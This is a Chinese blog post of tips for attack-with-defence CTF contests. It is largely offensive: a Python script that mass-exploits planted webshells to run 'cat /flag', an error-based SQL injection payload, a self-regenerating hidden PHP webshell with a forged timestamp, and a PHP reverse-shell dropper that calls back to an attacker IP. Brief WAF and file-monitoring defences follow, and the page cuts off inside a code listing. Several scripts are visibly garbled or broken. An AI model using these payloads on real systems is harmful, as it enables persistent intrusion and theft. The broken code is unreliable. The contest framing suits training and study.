<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Language" content="zh-cn">
    <meta charset="utf-8">
    
    
    
    <title>CTF线下赛AWD套路小结 | Echo&#39;s Blog | 在运维的道路上越走越远</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
    
    <meta name="theme-color" content="#77AAFF">
    
    
    <meta name="keywords" content="CTF,信息安全,网络空间安全,Python">
    
    

    

    <!-- Baidu Push -->
<script>
	(function(){
		var bp = document.createElement('script');
		var curProtocol = window.location.protocol.split(':')[0];
		if (curProtocol === 'https') {
			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
		}
		else {
			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
		}
		var s = document.getElementsByTagName("script")[0];
		s.parentNode.insertBefore(bp, s);
	})();

	var _hmt = _hmt || [];
</script>



    
    <meta name="description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
<meta name="keywords" content="CTF,信息安全,网络空间安全,Python">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF线下赛AWD套路小结">
<meta property="og:url" content="http://www.deops.cn/posts/28c30eb2/index.html">
<meta property="og:site_name" content="Echo&#39;s Blog">
<meta property="og:description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg">
<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg">
<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg">
<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg">
<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg">
<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg">
<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg">
<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/006ALkzYly1fvyfmg5lngj30ya0efn9u.jpg">
<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fvyfmfhytnj30j807rwf9.jpg">
<meta property="og:updated_time" content="2018-10-06T05:25:33.720Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CTF线下赛AWD套路小结">
<meta name="twitter:description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
<meta name="twitter:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="Echo&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    
            
</head>

<body>
    <div id="loading" class="active"></div>
    <aside id="menu"  class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" >
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.gif" alt="avatar">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname" id="name">Echo</h5>
          
            <div id="yiyanmotto" class="motto">&nbsp;</div>
          
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
              <li class="waves-block waves-effect">
                  <a href="/"  >
                    <i class="icon icon-lg icon-home"></i>
                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/archives"  >
                    <i class="icon icon-lg icon-archives"></i>
                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/tags"  >
                    <i class="icon icon-lg icon-tags"></i>
                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/album"  >
                    <i class="icon icon-lg icon-image"></i>
                    <span>相 册</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
              <li class="waves-block waves-effect">
                  <a href="/about"  >
                    <i class="icon icon-lg icon-smile-o"></i>
                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
                  </a>
              </li>
            
      <div class="nav2">
          
              <a class="nav2item" data-title="Email" href="http://t.cn/RrDDg7q" target="_parent"title="Email" >
                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
              </a>
          
              <a class="nav2item" data-title="Github" href="https://github.com/Marnm" target="_blank"title="Github" >
                <i class="icon icon-lg icon-github github"></i>
              </a>
          
              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6040025614" target="_blank"title="微博" >
                <i class="icon icon-lg icon-weibo weibo"></i>
              </a>
          

            </div>
        
      </ul>
        
    </div>
  </div>
 
</aside>


    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">CTF线下赛AWD套路小结</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
            <i class="icon icon-lg icon-rss"></i>
        </a>
    </div>
</header>
<header class="content-header post-header">
    
    
    <div class="container fade-scale">
        <div id="myheader">
            <h1 class="title">
                
            </h1>
            <h5 class="subtitle">
                
                
            </h5>
        </div>
    </div>

</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一、AWD模式简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、AWD模式简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二、网络环境"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、网络环境</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#三、-比赛分工"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、 比赛分工</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#四、-一些“套路”"><span class="post-toc-number">4.</span> <span class="post-toc-text">四、 一些“套路”</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#五、权限维持"><span class="post-toc-number">5.</span> <span class="post-toc-text">五、权限维持</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#六、-通用防御"><span class="post-toc-number">6.</span> <span class="post-toc-text">六、 通用防御</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#七、自动提交"><span class="post-toc-number">7.</span> <span class="post-toc-text">七、自动提交</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#八、流量、日志"><span class="post-toc-number">8.</span> <span class="post-toc-text">八、流量、日志</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#最后"><span class="post-toc-number">9.</span> <span class="post-toc-text">最后</span></a></li></ol>
        </nav>
    </aside>
   
<article id="post-CTF线下赛AWD套路小结"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">CTF线下赛AWD套路小结</h1>
        <div class="post-meta">
            <i class="icon icon-lg icon-calendar-o"></i>
            发表于
            <time class="post-time" title="2018-08-13 17:03:28" datetime="2018-08-13T09:03:28.000Z"  itemprop="datePublished">2018-08-13</time>

            <br id="mybreak"/>
            
	<i class="icon icon-lg icon-folder-o"></i>
	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>


            <i>·</i>
            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
</span>


        </div>
        <div class="post-count-custom">
            <i class="icon icon-lg icon-comment-o"></i>
            阅读本文可能花费您&nbsp;<span class="post-count">13</span>&nbsp;分钟
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <p>CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。<br>新手该知道的一些知识以及技巧，下面简单整理一下<br><a id="more"></a></p>
<blockquote>
<p>原创：tinyfisher<br>转载：<a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知安全技术社区</a></p>
</blockquote>
<p>最近打了2场CTF线下赛，把AWD模式中的一些小套路做一些总结，本人web狗，二进制部分就不班门弄斧了。</p>
<h1 id="一、AWD模式简介"><a href="#一、AWD模式简介" class="headerlink" title="一、AWD模式简介"></a>一、AWD模式简介</h1><p>AWD: Attack With Defence, 比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。<br><!--more--></p>
<ol>
<li>一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
<li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析；</li>
<li>flag在主办方的设定下每隔一定时间刷新一轮；</li>
<li>各队一般都有自己的初始分数；</li>
<li>flag一旦被其他队伍拿走，该队扣除一定积分；</li>
<li>扣除的积分有获取flag的队伍均分；</li>
<li>主办方会对每个队伍的服务进行check，服务宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分；</li>
<li>一般每个队伍会给一个低权限用户，非root权限</li>
</ol>
<h1 id="二、网络环境"><a href="#二、网络环境" class="headerlink" title="二、网络环境"></a>二、网络环境</h1><p>网络拓扑图如下图所示：</p>
<hr>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg" alt="拓扑图" title="">
                </div>
                <div class="image-caption">拓扑图</div>
            </figure>
<p>比赛中获取flag一般有两种模式：<br>（1）flag在根目录，读取flag内容，提交即可得分<br>（2）拿到其他队伍shell后，执行指定命令（curl 10.0.0.2），即可从上图中flag机获取flag内容；</p>
<p>比赛可能会告诉其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此首先利用nmap等扫描工具发现其他队伍的IP：<br><code>nmap -sn 192.168.71.0/24</code><br>或者利用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> 的脚本进行扫描</p>
<h1 id="三、-比赛分工"><a href="#三、-比赛分工" class="headerlink" title="三、 比赛分工"></a>三、 比赛分工</h1><p>线下赛一般3人左右，2人攻击，1人防御，因为发现的漏洞可以攻击其他队伍，也要进行修复，所以攻防相辅相成，以攻为守。</p>
<p>比赛中每个队伍可能会维护多个靶机，web、二进制等，也可以没人负责一台，各自负责攻击和防御。</p>
<h1 id="四、-一些“套路”"><a href="#四、-一些“套路”" class="headerlink" title="四、 一些“套路”"></a>四、 一些“套路”</h1><ol>
<li>备份！备份！备份！<br>重要的事情说三遍，比赛开始后第一时间备份服务器中web目录下的文件（/var/www/html)，这是我自我审计的基础，也是防止服务器在比赛中出现异常的情况下可以立即恢复到初始状态的先决条件。有的比赛可以提供3次左右的恢复初始设置的机会，有的比赛不提供，所以备份十分重要。</li>
</ol>
<p>可以用scp命令，也可以用一些图形化的工具：<code>Winscp</code>、<code>FileZilla</code>，操作起来比价方便。<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg" alt="winscp" title="">
                </div>
                <div class="image-caption">winscp</div>
            </figure></p>
<ol start="2">
<li>口令问题<br>弱口令的问题几乎是必考，比赛开始后，如果发现每个队伍的SSH账号密码都是一样的（某次比赛中都是phpCMS、WordPress），需要立即修改口令，如果被其他队伍改了那就gg了。</li>
</ol>
<p>Web后台很有可能存在弱口令，一般都是admin\admin,admin\123456,test\test等等，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell，比如十分常见的WordPress。<br><!--more--></p>
<ol start="3">
<li>预留后门<br>在维护的服务器上，很有可能已经预留了一个或多个后门，比如一句话木马，这是个送分题，可以利用这个漏洞迅速打一波，还可以视情况“搅屎”，利用这个漏洞一直维持权限，每轮都得分（后面细说）<br>将服务器中web目录下载到本地，利用<code>D盾</code>扫描，一般就可以发现预留后门：<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg" alt="D-dun" title="">
                </div>
                <div class="image-caption">D-dun</div>
            </figure>
发现后门，第一时间删除，同时利用这个漏洞发起第一波攻击，如果利用菜刀连，显然不够优雅，还没连完，人家估计都删的差不多了，因此这个漏洞虽然是送分题，但有时拼的是手速，因此得提前准备好脚本：<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://192.168.71."</span></span><br><span class="line">url1=<span class="string">""</span></span><br><span class="line">shell=<span class="string">"/Upload/index.php"</span></span><br><span class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span></span><br><span class="line">port=<span class="string">"80"</span></span><br><span class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</span><br><span class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line">f1=oepn(<span class="string">"firstroud_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>[<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]:</span><br><span class="line">	url1=url+str(i)+<span class="string">":"</span>+port+shell</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">			<span class="keyword">print</span> url1+<span class="string">" connect shell sucess, flag is "</span>+res.text</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess, flag is "</span>+res.text</span><br><span class="line">			<span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"shell not found!"</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>配置一下其他队伍地址、shell路径和密码，就可以进行攻击，发了个记录在firstround_flag.txt中，某次比赛实际情况如下：<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg" alt="flag" title="">
                </div>
                <div class="image-caption">flag</div>
            </figure></p>
<ol start="4">
<li>常见漏洞<br>常见漏洞包括SQL注入、文件包括、文件上传等等。对于SQL注入类的漏洞，一般不会有过滤，可以用<code>sqlmap</code>跑出来，在利用<code>-sql-shell</code>执行，<code>select load_file(&#39;/flag&#39;);</code>即可得到flag，也可以利用<code>into outfile</code>写木马维持权限，弹药根据实际情况，可能会遇到权限问题。用<code>sqlmap</code>跑比较耗时，可以利用<code>payload</code>写一个python，自动化进行攻击：<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> sess_admin</span><br><span class="line">	date = &#123;<span class="string">"section_name"</span>;<span class="string">"asd"</span>,<span class="string">"admin_name"</span>&#125;:</span><br><span class="line">	<span class="string">" '||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'"</span>,<span class="string">"announcement"</span>;<span class="string">"asd"</span></span><br><span class="line">	r = sess_admin.post(<span class="string">'http://%s/index.php/section/add'</span>%host,data=data)</span><br><span class="line">	flags = re.findall(<span class="string">r'~(.+?)~'</span>,r.content)</span><br><span class="line">	<span class="keyword">if</span> flags:</span><br><span class="line">		<span class="keyword">return</span> flags[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"error pwn!"</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>上传漏洞一般也是比较简单的黑名单过滤、服务器解析漏洞等等，可以直接上传木马；</p>
<h1 id="五、权限维持"><a href="#五、权限维持" class="headerlink" title="五、权限维持"></a>五、权限维持</h1><p>这里说的方法就比较“搅屎”了，上面说到利用预留后门可以维持权限，主要哟两种，一种是“不死马”，另一种是反弹shell</p>
<ul>
<li><strong>“不死马”</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	set_time_limit(<span class="number">0</span>);</span><br><span class="line">	ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">	unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		file_put_contents(<span class="string">'./.config.php'</span>,<span class="string">'&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;'</span>);</span><br><span class="line">		system(<span class="string">'chmod 777 .config.php'</span>);</span><br><span class="line">		touch(<span class="string">"./.config.php"</span>,mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">28</span>,<span class="number">2016</span>));</span><br><span class="line">		usleep(<span class="number">100</span>);</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>利用预留后门，上传上面的“不死马“并访问，就会一直生成.config.php的一句话木马，木马内容可以自修修改，只要别被其他队伍看懂就行，哈哈哈</p>
<ul>
<li><strong>“反弹shell”</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span> </span>&#123;</span><br><span class="line">		$path = excute(<span class="string">"which $pr"</span>);</span><br><span class="line">		<span class="keyword">return</span> ($path ? $path : $pr);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">excute</span><span class="params">($cfe)</span> </span>&#123;</span><br><span class="line">		$res = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> ($cfe) &#123;</span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">			@exec($cfe,$res);</span><br><span class="line">			$res = join(<span class="string">"\n"</span>,$res);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">			$res = @shell_exec($cfe);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@system($cfe);</span><br><span class="line">			$res = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (function_exists(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">			@ob_start();</span><br><span class="line">			@passthru($cfe);</span><br><span class="line">			$res = @ob_get_contents();</span><br><span class="line">			@ob_end_clean();</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (@is_resource($f = @popen($cfe,<span class="string">"r"</span>))) &#123;</span><br><span class="line">			$res = @fread($f, <span class="number">1024</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		@pclose($f);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $res;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($name,$text)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>($fp=@fopen($fname, <span class="string">'w'</span>)) &#123;</span><br><span class="line">			$fputs($fp,@base64_decode($text));</span><br><span class="line">			@fclose($fp);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$yourip = <span class="string">"192.168.71.1"</span>;</span><br><span class="line">	$yourport = <span class="string">'9999'</span>;</span><br><span class="line">	$usedb = <span class="keyword">array</span>(<span class="string">'per'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line">	$back_connect=<span class="string">"..."</span></span><br><span class="line">	cf(<span class="string">'/tmp/.bc'</span>,$back_connect);</span><br><span class="line">	$res = execute(which(<span class="string">'perl'</span>)<span class="string">" /tmp/.db $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了<br><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg" alt="php" title="">
                </div>
                <div class="image-caption">php</div>
            </figure><br>需要注意的是，上面的2中方法，需要网站的权限为www-data,如果网站的权限是ctf，那么是没有权限上传文件的。</p>
<h1 id="六、-通用防御"><a href="#六、-通用防御" class="headerlink" title="六、 通用防御"></a>六、 通用防御</h1><p>对于防御，一般通用有两种方法：WAF、文件监控<br><strong>1. WAF</strong></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>
<p>使用方法：</p>
<ol>
<li>将waf.php传到要包含的文件的目录</li>
<li>在页面中加入防护，哟两种做法，根据情况二选一即可：<br>a).在所需要防护的页面加入代码<br><code>require_once(&#39;waf.php&#39;);</code><br>就可以做到页面防注入、跨站<br>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.icn.php中！<br>添加<code>require_once(&#39;waf.php&#39;);</code>来调用代码<br>常用php系统添加文件</li>
</ol>
<blockquote>
<p>PHPCMS v9 \phpcms\base.php<br>PHPWIND8.7 \data\sql_config.php<br>DEDECMS 5.7 \data\common.inc.php<br>Discuz X2 \config\config.php_global.php<br>WordPress \wp-config.php<br>Metinfo \include\head.php</p>
</blockquote>
<p>b). 在每个文件最前加上代码<br>在<code>php.ini</code>中找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automaticaly add files before or after any PHP document.</span><br><span class="line">auto_prepend_file = 360_safe3.php路径；</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。</p>
<p><strong>2. 文件监控</strong><br>文件监控可以对web目录进行监控，发现新上传文件或者被修改立即恢复，这样可以防止上传shell等攻击：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span 